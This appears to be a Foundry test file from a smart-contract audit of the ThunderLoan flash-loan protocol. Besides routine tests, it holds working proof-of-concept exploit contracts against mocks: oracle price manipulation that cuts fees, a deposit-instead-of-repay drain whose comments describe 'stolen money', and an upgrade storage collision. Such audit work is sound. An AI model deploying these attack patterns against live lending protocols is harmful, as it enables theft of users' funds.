// SPDX-License-Identifier: MIT
pragma solidity 0.8.20;

import { Test, console } from "forge-std/Test.sol";
import { BaseTest, ThunderLoan } from "./BaseTest.t.sol";
import { AssetToken } from "../../src/protocol/AssetToken.sol";
import { MockFlashLoanReceiver } from "../mocks/MockFlashLoanReceiver.sol";
import { ERC20Mock } from "../mocks/ERC20Mock.sol";
import { ERC1967Proxy } from "@openzeppelin/contracts/proxy/ERC1967/ERC1967Proxy.sol";
import { BuffMockPoolFactory } from "../mocks/BuffMockPoolFactory.sol";
import { BuffMockTSwap } from "../mocks/BuffMockTSwap.sol";
import { IFlashLoanReceiver } from "../../src/interfaces/IFlashLoanReceiver.sol";
import { IERC20 } from "@openzeppelin/contracts/interfaces/IERC20.sol";
import { ThunderLoanUpgraded } from "../../src/upgradedProtocol/ThunderLoanUpgraded.sol";

contract ThunderLoanTest is BaseTest {
    uint256 constant AMOUNT = 10e18;
    uint256 constant DEPOSIT_AMOUNT = AMOUNT * 100;
    address liquidityProvider = address(123);
    address user = address(456);
    MockFlashLoanReceiver mockFlashLoanReceiver;

    function setUp() public override {
        super.setUp();
        vm.prank(user);
        mockFlashLoanReceiver = new MockFlashLoanReceiver(address(thunderLoan));
    }

    function testInitializationOwner() public {
        assertEq(thunderLoan.owner(), address(this));
    }

    function testSetAllowedTokens() public {
        vm.prank(thunderLoan.owner());
        thunderLoan.setAllowedToken(tokenA, true);
        assertEq(thunderLoan.isAllowedToken(tokenA), true);
    }

    function testOnlyOwnerCanSetTokens() public {
        vm.prank(liquidityProvider);
        vm.expectRevert();
        thunderLoan.setAllowedToken(tokenA, true);
    }

    function testSettingTokenCreatesAsset() public {
        vm.prank(thunderLoan.owner());
        AssetToken assetToken = thunderLoan.setAllowedToken(tokenA, true);
        assertEq(address(thunderLoan.getAssetFromToken(tokenA)), address(assetToken));
    }

    function testCantDepositUnapprovedTokens() public {
        tokenA.mint(liquidityProvider, AMOUNT);
        tokenA.approve(address(thunderLoan), AMOUNT);
        vm.expectRevert(abi.encodeWithSelector(ThunderLoan.ThunderLoan__NotAllowedToken.selector, address(tokenA)));
        thunderLoan.deposit(tokenA, AMOUNT);
    }

    modifier setAllowedToken() {
        vm.prank(thunderLoan.owner());
        thunderLoan.setAllowedToken(tokenA, true);
        _;
    }

    function testDepositMintsAssetAndUpdatesBalance() public setAllowedToken {
        tokenA.mint(liquidityProvider, AMOUNT);

        vm.startPrank(liquidityProvider);
        tokenA.approve(address(thunderLoan), AMOUNT);
        thunderLoan.deposit(tokenA, AMOUNT);
        vm.stopPrank();

        AssetToken asset = thunderLoan.getAssetFromToken(tokenA);
        assertEq(tokenA.balanceOf(address(asset)), AMOUNT);
        assertEq(asset.balanceOf(liquidityProvider), AMOUNT);
    }

    modifier hasDeposits() {
        vm.startPrank(liquidityProvider);
        tokenA.mint(liquidityProvider, DEPOSIT_AMOUNT);
        tokenA.approve(address(thunderLoan), DEPOSIT_AMOUNT);
        thunderLoan.deposit(tokenA, DEPOSIT_AMOUNT);
        vm.stopPrank();
        _;
    }

    function testFlashLoan() public setAllowedToken hasDeposits {
        // uint256 constant AMOUNT = 10e18;
        uint256 amountToBorrow = AMOUNT * 10; //100e18
        uint256 calculatedFee = thunderLoan.getCalculatedFee(tokenA, amountToBorrow);
        vm.startPrank(user);
        tokenA.mint(address(mockFlashLoanReceiver), AMOUNT);
        thunderLoan.flashloan(address(mockFlashLoanReceiver), tokenA, amountToBorrow, "");
        vm.stopPrank();

        assertEq(mockFlashLoanReceiver.getBalanceDuring(), amountToBorrow + AMOUNT);
        assertEq(mockFlashLoanReceiver.getBalanceAfter(), AMOUNT - calculatedFee);
        console.log(calculatedFee);
    }

    function testRedeemAfterFlashLoan() public setAllowedToken hasDeposits {
        uint256 amountToBorrow = AMOUNT * 10;
        uint256 calculatedFee = thunderLoan.getCalculatedFee(tokenA, amountToBorrow);

        vm.startPrank(user);
        tokenA.mint(address(mockFlashLoanReceiver), AMOUNT);
        thunderLoan.flashloan(address(mockFlashLoanReceiver), tokenA, amountToBorrow, "");
        vm.stopPrank();

        vm.startPrank(liquidityProvider);
        uint256 redeemAmountByLiq = type(uint256).max;
        thunderLoan.redeem(tokenA, redeemAmountByLiq);
        // redeem amount 1003300900000000000000 1003e18
        // deposited amount  //1000e18
        //fee 0.3e18
        //amount expected to reddem => 1000.3e18; but get 1003e18
        vm.stopPrank();
    }

    function testPriceOracleManipulation() public {
        thunderLoan = new ThunderLoan();
        tokenA = new ERC20Mock();
        proxy = new ERC1967Proxy(address(thunderLoan), "");
        BuffMockPoolFactory pf = new BuffMockPoolFactory(address(weth));
        address tswapPool = pf.createPool(address(tokenA));
        thunderLoan = ThunderLoan(address(proxy));
        thunderLoan.initialize(address(pf));

        // fund tswap
        vm.startPrank(liquidityProvider);
        tokenA.mint(liquidityProvider, 100e18);
        tokenA.approve(address(tswapPool), 1002e18);
        weth.mint(liquidityProvider, 100e18);
        weth.approve(address(tswapPool), 1002e18);
        BuffMockTSwap(tswapPool).deposit(100e18, 100e18, 100e18, block.timestamp);
        vm.stopPrank();

        // fund flashLoan
        vm.prank(thunderLoan.owner());
        thunderLoan.setAllowedToken((tokenA), true);
        uint256 normalFees = thunderLoan.getCalculatedFee(tokenA, 100e18);
        vm.startPrank(liquidityProvider);
        tokenA.mint(liquidityProvider, 1000e18);
        tokenA.approve(address(thunderLoan), 1000e18);
        thunderLoan.deposit(tokenA, 1000e18);
        vm.stopPrank();
        // 100 weth and 100tokenA in tswap
        // 1000 tokenA in flashLoan
        uint256 amountToBorrow = 50e18;
        MaliciousFlashLoanReceiver mflr = new MaliciousFlashLoanReceiver(
            address(tswapPool), address(thunderLoan), address(thunderLoan.getAssetFromToken(tokenA))
        );
        vm.startPrank(user);
        tokenA.mint(address(mflr), 200e18); //for fees
        thunderLoan.flashloan(address(mflr), IERC20(tokenA), amountToBorrow, "");
        vm.stopPrank();

        uint256 attackFees = mflr.feeOne() + mflr.feeTwo();

        console.log("attack Fee", attackFees);
        console.log("normalFees", normalFees);
        console.log("mflr.feeOne()", mflr.feeOne());
        console.log("mflr.feeTwo()", mflr.feeTwo());
        assert(normalFees > attackFees);
        //   attack Fee 214167600932190305
        //   normalFees 296147410319118389
        //   mflr.feeOne() 148073705159559194 => 1.48073705159559194e17
        //   mflr.feeTwo() 66093895772631111 =>6.6093895772631111e16
    }

    function testDepositOverReplay() public setAllowedToken hasDeposits {
        vm.startPrank(user);
        uint256 amountToBorrow = 50e18;
        uint256 fees = thunderLoan.getCalculatedFee(tokenA, amountToBorrow);
        DepositOverRepay dor = new DepositOverRepay(address(thunderLoan));
        tokenA.mint(address(dor), fees);
        thunderLoan.flashloan(address(dor), tokenA, amountToBorrow, "");
        dor.redeemMoney();
        vm.stopPrank();
        assertGe(tokenA.balanceOf(address(dor)), amountToBorrow + fees);
        // 50.15718582989109e18 stolen money
        // 50.15e18 amountToBorrow + fees
        console.log("amountToBorrow + fees", (amountToBorrow + fees));
    }

    function testStorageCollion() public {
        vm.startPrank(thunderLoan.owner());
        uint256 originalValue = thunderLoan.getFee();
        ThunderLoanUpgraded upgraded = new ThunderLoanUpgraded();
        thunderLoan.upgradeToAndCall(address(upgraded), "");
        uint256 afterUpgradeValue = thunderLoan.getFee();
        vm.stopPrank();
        console.log("originalValue", originalValue);
        console.log("afterUpgradeValue", afterUpgradeValue);
    }
}
/*//////////////////////////////////////////////////////////////
                             TEST-CONTRACTS
    //////////////////////////////////////////////////////////////*/

contract DepositOverRepay is IFlashLoanReceiver {
    ThunderLoan thunderLoan;
    address s_token;
    AssetToken assetToken;

    constructor(address _thunderloan) {
        thunderLoan = ThunderLoan(_thunderloan);
    }

    function executeOperation(
        address token,
        uint256 amount,
        uint256 fee,
        address, /*initiator*/
        bytes calldata /*params*/
    )
        external
        returns (bool)
    {
        s_token = token;
        IERC20(s_token).approve(address(thunderLoan), 1000e19);
        thunderLoan.deposit(IERC20(token), amount + fee);
    }

    function redeemMoney() public {
        assetToken = thunderLoan.getAssetFromToken(IERC20(s_token));
        uint256 assetTokenAmount = assetToken.balanceOf(address(this));
        thunderLoan.redeem(IERC20(s_token), assetTokenAmount);
        // console.log(assetTokenAmount);
    }
}

contract MaliciousFlashLoanReceiver is IFlashLoanReceiver {
    ThunderLoan thunderLoan;
    address repayAddress;
    BuffMockTSwap tswapPool;
    bool attacked;
    uint256 public feeOne;
    uint256 public feeTwo;

    // 1. Swap TokenA borrowed for WETH
    // 2. Take out a second flash loan to compare fees
    constructor(address _tswapPool, address _thunderLoan, address _repayAddress) {
        tswapPool = BuffMockTSwap(_tswapPool);
        thunderLoan = ThunderLoan(_thunderLoan);
        repayAddress = _repayAddress;
    }

    function executeOperation(
        address token,
        uint256 amount,
        uint256 fee,
        address, /*initiator*/
        bytes calldata /*params*/
    )
        external
        returns (bool)
    {
        if (!attacked) {
            feeOne = fee;
            attacked = true;
            uint256 wethBought = tswapPool.getOutputAmountBasedOnInput(50e18, 100e18, 100e18);
            IERC20(token).approve(address(tswapPool), 50e18);
            // Tanks the price:
            tswapPool.swapPoolTokenForWethBasedOnInputPoolToken(50e18, wethBought, block.timestamp);
            //second flash loan
            //      address receiverAddress,
            // IERC20 token,
            // uint256 amount,
            // bytes calldata params
            // calling flash loan for 2nd time
            thunderLoan.flashloan(address(this), IERC20(token), amount, "");

            // IERC20(token).approve(address(thunderLoan), amount + fee);
            // thunderLoan.repay(IERC20(token), amount + fee);
            IERC20(token).transfer(address(repayAddress), amount + fee);
        } else {
            // calculate the fee and repay
            feeTwo = fee;
            // IERC20(token).approve(address(thunderLoan), amount + fee);
            // thunderLoan.repay(IERC20(token), amount + fee);
            // since mutex lock in repay function
            IERC20(token).transfer(address(repayAddress), amount + fee);
        }
        return true;
    }
}
